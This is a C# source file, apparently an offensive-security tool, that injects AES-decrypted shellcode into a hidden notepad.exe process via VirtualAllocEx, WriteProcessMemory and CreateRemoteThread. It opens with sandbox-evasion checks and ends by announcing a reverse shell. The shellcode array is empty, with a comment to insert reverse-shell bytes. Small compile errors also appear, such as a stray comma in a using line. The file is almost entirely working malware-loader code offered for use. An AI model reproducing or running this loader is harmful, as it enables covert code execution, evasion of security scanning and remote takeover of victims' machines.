/* 
    SIMPLE Process Injection
    decription: inject shellcode into a newly spawed remote process.
 */

 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography,
 using System.Text;
 using System.IO;


 namespace SimpleProcessInjectionhaha
 {
    class Program {
        public const uint PAGE_RWX = 0x40;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandler,
            int processId
        );
        
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
        );

        [DllImport("kernel32.dll")]
        public static extern IntPtr WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpShellcodeFer,
            Int32 nsize,
            out IntPtr lpNumberOfBytesWritten
        );
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreatAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParam,
            uint dwCreationFlags,
            out IntPtr lpThreatID
        );

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocExNuma(
            IntPtr hProcess, 
            IntPtr lpAddress, 
            uint dwSize, 
            UInt32 flAllocationType, 
            UInt32 flProtect, 
            UInt32 nndPreferred
        );

        [DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);
        // this is for the encryption using xor if you want to use another one like aes256 you need to implement it here
        private static byte[] xor(byte[] cipher, byte[] key)
        {
            byte[] xored = new byte[cipher.Length];

            for (int i = 0; i < cipher.Length; i++)
            {
                xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }

            return xored;
        }

        private static byte[] decAes(byte[] cipher, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.Blocksize = 128;
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.Zeros;

                using (var ms = new MemoryStream(cipher))
                {
                    using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))
                    {
                        using (var br = new BinaryReader(cs))
                        {
                            return br.ReadBytes(cipher.Length);
                        }
                    }
                }
            }
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[+] Running sandbox evasion using the non-emulated API VirtualAllocExNuma");

            IntPtr mem = VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                Console.WriteLine("(VirtualAllocExNuma) [-] Failed check");
                return;
            }


            Console.WriteLine("[+] Delay of three seconds for scan bypass check");

            DateTime time1 = DateTime.Now;
            Sleep(3000);
            double time2 = DateTime.Now.Subtract(time1).TotalSeconds;
            if (time2 < 2.5)
            {
                Console.WriteLine("(Sleep) [-] Failed check");
                return;
            }

            IntPtr hProcess;
            IntPtr addr = IntPtr.Zero;

            Console.WriteLine("[+] Opening notepad.exe in the background");
            // Launches notepad.exe in background
            Process p = new Process();
            p.StartInfo = new ProcessStartInfo("notepad.exe");
            p.StartInfo.WorkingDirectory = @"C:\Windows\System32\";
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();

            // Get the pid of the notepad process - this can be any process you have the rights to
            int pid = Process.GetProcessesByName("notepad")[0].Id;

            Console.WriteLine("[+] OpenProcess with PID {0}.", new string[] { pid.ToString() });

            // Get a handle to the explorer process. 0x001F0FFF = PROCESS_ALL access right
            hProcess = OpenProcess(0x001F0FFF, false, pid);


            string key = "1ThisShouldBeThirtyTwoBytesLong1";
            string iv = "94dff9c699e9e849";
            byte[] xorshellcode = new byte[591] {
                //insert the shell code here genereated with create_reverse_shell
            };

            byte[] shellcode;
            shellcode = decAes(xorshellcode, Encoding.ASCII.GetBytes(key), Encoding.ASCII.GetBytes(iv));


            Console.WriteLine("[+] VirtualAllocEx (PAGE_EXECUTE_READ_WRITE) on 0x{0}", new string[] { hProcess.ToString("X") });
            // Allocate memory in the remote process
            addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, PAGE_RWX);

            Console.WriteLine("[+] WriteProcessMemory to 0x{0}", new string[] { addr.ToString("X") });
            // Write shellcode[] to the remote process memory
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);

            Console.WriteLine("[+] CreateRemoteThread to 0x{0}", new string[] { addr.ToString("X") });
            // Create the remote thread in a suspended state = 0x00000004
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out hThread);

            Console.WriteLine("[+] Enjoy your shell from notepad");
            //This is for debug. You can comment the below line if you do not need to read all the console messages
            System.Threading.Thread.Sleep(3000);
        }

    }
 }